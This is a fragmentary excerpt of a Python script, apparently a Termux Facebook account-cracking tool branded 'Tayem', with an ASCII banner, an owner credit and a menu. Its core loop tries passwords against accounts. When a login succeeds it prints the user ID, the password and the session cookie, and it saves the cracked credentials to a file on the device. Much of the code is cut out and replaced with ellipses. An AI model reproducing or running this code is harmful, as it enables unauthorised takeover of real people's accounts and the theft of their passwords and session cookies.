...
ha = current.day
today = date.today()
#Tayem2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mTayem')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Tayem/1.2.0 OPN-B'
...
def banner():
    clear()
    print(f"""\033[1;92m
\033[1;33m._________ _______           _______  _______ 
\033[1;33m.\__   __/(  ___  )|\     /|(  ____ \(       )
\033[1;33m.   ) (   | (   ) |( \   / )| (    \/| () () |
\033[1;33m.   | |   | (___) | \ (_) / | (__    | || || |
\033[1;33m.   | |   |  ___  |  \   /  |  __)   | |(_)| |
\033[1;33m.   | |   | (   ) |   ) (   | (      | |   | |
 ...
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mTayem \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mTayem KHAN \033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/idkhur.tayem.999')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Tayem_OK.mp3")
                print('\033[1;92m[Tayem-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Tayem-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mTayem","\x1b[1;92mTayem","\x1b[1;93mTayem","\x1b[1;94mTayem","\x1b[1;95mTayem","\x1b[1;96mTayem","\x1b[1;97mTayem","\x1b[1;91mTayem","\x1b[1;92mTayem","\x1b[1;93mTayem","\x1b[1;94mTayem","\x1b[1;95mTayem","\x1b[1;96mTayem"])
